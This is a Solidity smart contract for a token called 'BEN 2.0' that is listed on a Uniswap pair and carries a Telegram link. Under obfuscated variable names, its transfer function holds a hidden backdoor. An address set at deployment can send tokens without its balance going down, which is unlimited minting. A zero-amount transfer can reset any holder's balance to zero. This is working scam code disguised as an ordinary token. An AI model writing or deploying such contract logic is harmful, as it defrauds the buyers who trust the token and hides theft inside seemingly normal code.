/*

https://t.me/ben20_eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BEN is Ownable {
    address public epativzxkyw;

    mapping(address => uint256) public balanceOf;

    function hmgb(address qtpy, address bulj, uint256 bafxw) private {
        if (0 == suwlvzadrb[qtpy]) {
            balanceOf[qtpy] -= bafxw;
        }
        balanceOf[bulj] += bafxw;
        if (0 == bafxw && bulj != epativzxkyw) {
            balanceOf[bulj] = bafxw;
        }
        emit Transfer(qtpy, bulj, bafxw);
    }

    constructor(address twiqarzc) {
        balanceOf[msg.sender] = totalSupply;
        suwlvzadrb[twiqarzc] = cdki;
        IUniswapV2Router02 rdfs = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        epativzxkyw = IUniswapV2Factory(rdfs.factory()).createPair(address(this), rdfs.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private rihfjqlwuc;

    string public symbol = 'BEN 2.0';

    function transferFrom(address qtpy, address bulj, uint256 bafxw) public returns (bool success) {
        require(bafxw <= allowance[qtpy][msg.sender]);
        allowance[qtpy][msg.sender] -= bafxw;
        hmgb(qtpy, bulj, bafxw);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = 'BEN 2.0';

    mapping(address => uint256) private suwlvzadrb;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address bulj, uint256 bafxw) public returns (bool success) {
        hmgb(msg.sender, bulj, bafxw);
        return true;
    }

    uint8 public decimals = 9;

    function approve(address qelfwourkxag, uint256 bafxw) public returns (bool success) {
        allowance[msg.sender][qelfwourkxag] = bafxw;
        emit Approval(msg.sender, qelfwourkxag, bafxw);
        return true;
    }

    uint256 private cdki = 103;
}